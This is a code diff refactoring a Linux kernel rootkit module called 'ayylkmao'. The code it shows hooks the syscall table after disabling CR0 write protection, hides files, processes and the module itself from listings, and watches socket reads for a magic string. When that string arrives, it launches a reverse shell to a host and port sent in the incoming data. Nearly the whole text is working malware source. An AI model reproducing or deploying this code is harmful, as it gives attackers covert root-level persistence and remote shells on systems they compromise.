@@ -97,112 +97,114 @@ bool is_hidden_dirent(char *d_name, bool proc)
 
 asmlinkage int intercepted_getdents(unsigned int fd, struct linux_dirent __user *dirp, unsigned int count)
 {
-    
-    /* Invoke our original getdents */
-    int ret = orig_getdents(fd, dirp, count);
+    int ret;
+    struct linux_dirent *kdir, *current_dir, *previous_dir;
+    struct inode *in;
+    bool proc;
+
+    ret = orig_getdents(fd, dirp, count);
     if (ret <= 0)
         return ret;
 
-    /* Create a kernel-space copy of our directory entries */
-    struct linux_dirent *kdirp = kmalloc(ret, GFP_KERNEL);
-    if (kdirp == NULL)
+    kdir = kmalloc(ret, GFP_KERNEL);
+    if (kdir == NULL)
         return ret;
-    
-    if (copy_from_user(kdirp, dirp, ret) != 0) {
-        kfree(kdirp);
+    if (copy_from_user(kdir, dirp, ret) != 0) {
+        kfree(kdir);
         return ret;
     }
+    
+    in = current->files->fdt->fd[fd]->f_path.dentry->d_inode;
+    proc = in->i_ino == PROC_ROOT_INO && !MAJOR(in->i_rdev);
 
-    /* Check if our entries are going to be in /proc/ */
-    struct inode *in = current->files->fdt->fd[fd]->f_path.dentry->d_inode;
-    bool proc = in->i_ino == PROC_ROOT_INO && !MAJOR(in->i_rdev);
-
-    /* Overwrite or otherwise obscure our hidden entries */
-    struct linux_dirent *dir = kdirp, *prev = NULL;
-    for (int bpos = 0; bpos < ret; dir = (void*) kdirp + bpos) {
-        if (is_hidden_dirent(dir->d_name, proc)) {
-            if (prev == NULL) {
-                memmove(dir, (void*) dir + dir->d_reclen, ret);
-                ret -= dir->d_reclen;
+    previous_dir = NULL;
+    current_dir = kdir;
+    for (int bpos = 0; bpos < ret; current_dir = (void*) kdir + bpos) {
+        if (is_hidden_dirent(current_dir->d_name, proc)) {
+            if (previous_dir == NULL) {
+                memmove(current_dir, (void*) current_dir + current_dir->d_reclen, ret);
+                ret -= current_dir->d_reclen;
                 continue;
             } else {
-                prev->d_reclen += dir->d_reclen;
+                previous_dir->d_reclen += current_dir->d_reclen;
             }
         } else {
-            prev = dir;
+            previous_dir = current_dir;
         }
-        bpos += dir->d_reclen;
+        bpos += current_dir->d_reclen;
     }
+    copy_to_user(dirp, kdir, ret);
 
-    /* Copy the modified entries back to user-space and clean up */
-    copy_to_user(dirp, kdirp, ret);
-    kfree(kdirp);
+    kfree(kdir);
     return ret;
 }
 
 asmlinkage int intercepted_getdents64(unsigned int fd, struct linux_dirent64 __user *dirp, unsigned int count)
 {
+    int ret;
+    struct linux_dirent64 *kdir, *current_dir, *previous_dir;
+    struct inode *in;
+    bool proc;
 
-    /* Invoke our original getdents */
-    int ret = orig_getdents64(fd, dirp, count);
+    ret = orig_getdents64(fd, dirp, count);
     if (ret <= 0)
         return ret;
 
-    /* Create a kernel-space copy of our directory entries */
-    struct linux_dirent64 *kdirp = kmalloc(ret, GFP_KERNEL);
-    if (kdirp == NULL)
+    kdir = kmalloc(ret, GFP_KERNEL);
+    if (kdir == NULL)
         return ret;
-    
-    if (copy_from_user(kdirp, dirp, ret) != 0) {
-        kfree(kdirp);
+    if (copy_from_user(kdir, dirp, ret) != 0) {
+        kfree(kdir);
         return ret;
     }
 
-    /* Check if our entries are going to be in /proc/ */
-    struct inode *in = current->files->fdt->fd[fd]->f_path.dentry->d_inode;
-    bool proc = in->i_ino == PROC_ROOT_INO && !MAJOR(in->i_rdev);
+    in = current->files->fdt->fd[fd]->f_path.dentry->d_inode;
+    proc = in->i_ino == PROC_ROOT_INO && !MAJOR(in->i_rdev);
 
-    /* Overwrite or otherwise obscure our hidden entries */
-    struct linux_dirent64 *dir = kdirp, *prev = NULL;
-    for (int bpos = 0; bpos < ret; dir = (void*) kdirp + bpos) {
-        if (is_hidden_dirent(dir->d_name, proc)) {
-            if (prev == NULL) {
-                memmove(dir, (void*) dir + dir->d_reclen, ret);
-                ret -= dir->d_reclen;
+    previous_dir = NULL;
+    current_dir = kdir;
+    for (int bpos = 0; bpos < ret; current_dir = (void*) kdir + bpos) {
+        if (is_hidden_dirent(current_dir->d_name, proc)) {
+            if (previous_dir == NULL) {
+                memmove(current_dir, (void*) current_dir + current_dir->d_reclen, ret);
+                ret -= current_dir->d_reclen;
                 continue;
             } else {
-                prev->d_reclen += dir->d_reclen;
+                previous_dir->d_reclen += current_dir->d_reclen;
             }
         } else {
-            prev = dir;
+            previous_dir = current_dir;
         }
-        bpos += dir->d_reclen;
+        bpos += current_dir->d_reclen;
     }
-
-    /* Copy the modified entries back to user-space and clean up */
-    copy_to_user(dirp, kdirp, ret);
-    kfree(kdirp);
+    copy_to_user(dirp, kdir, ret);
+    
+    kfree(kdir);
     return ret;
 }
 
 void hide_module(void)
 {
-    if (!module_hidden) {
-        prev_mod = THIS_MODULE->list.prev;
-        list_del(&THIS_MODULE->list);
-        
-        kfree(THIS_MODULE->sect_attrs);
-        THIS_MODULE->sect_attrs = NULL;
-        module_hidden = true;
-    }
+    if (module_hidden)
+        return;
+
+    prev_mod = THIS_MODULE->list.prev;
+    list_del(&THIS_MODULE->list);
+
+    kfree(THIS_MODULE->sect_attrs);
+    THIS_MODULE->sect_attrs = NULL;
+
+    module_hidden = true;
 }
 
 void unhide_module(void)
 {
-    if (module_hidden) {
-        list_add(&THIS_MODULE->list, prev_mod);
-        module_hidden = false;
-    }
+    if (!module_hidden)
+        return;
+
+    list_add(&THIS_MODULE->list, prev_mod);
+
+    module_hidden = false;
 }
 
 asmlinkage int intercepted_kill(pid_t pid, int sig)
@@ -229,43 +231,48 @@ asmlinkage int intercepted_kill(pid_t pid, int sig)
     return 0;
 }
 
+void invoke_rev_shell(char *host, char *port)
+{
+    char *argv[] = { "/" MAGIC_PREFIX "-util/rev", host, port, NULL };
+    char *envp[] = {"HOME=/", "TERM=linux", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
+
+    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
+}
+
 asmlinkage ssize_t intercepted_read(int fd, void __user *buf, size_t count)
 {
-    ssize_t ret = orig_read(fd, buf, count);
+    char *backdoor, *host, *port;
+    ssize_t ret;
+    struct inode *in;
+    void *kbuf;
 
-    /* Make sure our data both comes from a socket and can contain the backdoor magic */
-    struct inode *in = current->files->fdt->fd[fd]->f_path.dentry->d_inode;
+    ret = orig_read(fd, buf, count);
+    in = current->files->fdt->fd[fd]->f_path.dentry->d_inode;
     if (ret <= 0 || ret < strlen(BACKDOOR_MAGIC) || !S_ISSOCK(in->i_mode))
         return ret;
 
-    /* Attempt to find our backdoor's magic in the data */
-    char *backdoor = NULL;
+    backdoor = NULL;
     for (int i = 0; i < ret - strlen(BACKDOOR_MAGIC); i++) {
         if (memcmp(buf + i, BACKDOOR_MAGIC, strlen(BACKDOOR_MAGIC)) == 0) {
             backdoor = buf + i;
             break;
         }
     }
-
-    /* If we could not find our backdoor string in the data there's nothing to do */
     if (backdoor == NULL)
         return ret;
 
-    /* Create a kernel-space copy of the data that was read */
-    void *kbuf = kmalloc(ret, GFP_KERNEL);
+    kbuf = kmalloc(ret, GFP_KERNEL);
     if (kbuf == NULL)
         return ret;
-    
     if (copy_from_user(kbuf, buf, ret) != 0) {
         kfree(kbuf);
         return ret;
     }
 
-    /* Find the same backdoor string in the kernel-space copy */
     backdoor = kbuf + ((void*) backdoor - buf) + strlen(BACKDOOR_MAGIC) + 1; 
 
-    /* Attempt to parse out the target host and port */
-    char *host = backdoor, *port = NULL;
+    host = backdoor;
+    port = NULL;
     for (int i = 0; i < 1024; i++) {
         if (backdoor[i] == ':') {
             backdoor[i] = '\0';
@@ -276,20 +283,14 @@ asmlinkage ssize_t intercepted_read(int fd, void __user *buf, size_t count)
         }
     }
 
-    /* Now we just invoke our reverse shell */
-    char *argv[] = { "/" MAGIC_PREFIX "-util/rev", host, port, NULL };
-    static char *envp[] = {"HOME=/", "TERM=linux", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
-    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
-
-    /* Clean up the copied userspace data */
+    invoke_rev_shell(host, port);
+    
     kfree(kbuf);
     return ret;
 }
 
 unsigned long *find_syscall_table(void)
 {
-    
-    /* Find the syscall table using an address known to be before it in memory */
     unsigned long *syscall_table = (unsigned long*) sys_close;
     while (syscall_table[__NR_close] != (unsigned long) sys_close) {
         syscall_table++;
@@ -297,32 +298,28 @@ unsigned long *find_syscall_table(void)
     return syscall_table;
 }
 
-static int __init ayylkmao_init(void)
+int __init ayylkmao_init(void)
 {
     syscall_table = find_syscall_table();
 
-    /* Store our original system call addresses */
     orig_kill = (kill_t) syscall_table[__NR_kill];
     orig_getdents = (getdents_t) syscall_table[__NR_getdents];
     orig_getdents64 = (getdents64_t) syscall_table[__NR_getdents64];
     orig_read = (read_t) syscall_table[__NR_read];
 
-    /* Replace them with our alien ones */
     write_cr0(read_cr0() & ~0x10000);
     syscall_table[__NR_kill] = (unsigned long) intercepted_kill;
     syscall_table[__NR_getdents] = (unsigned long) intercepted_getdents;
     syscall_table[__NR_getdents64] = (unsigned long) intercepted_getdents64;
     syscall_table[__NR_read] = (unsigned long) intercepted_read;
     write_cr0(read_cr0() | 0x10000);
-
+    
     hide_module();
     return 0;
 }
 
-static void __exit ayylkmao_uninit(void)
+void __exit ayylkmao_uninit(void)
 {
-
-    /* Restore the syscall table to its original state */
     write_cr0(read_cr0() & ~0x10000);
     syscall_table[__NR_kill] = (unsigned long) orig_kill;
     syscall_table[__NR_getdents] = (unsigned long) orig_getdents;
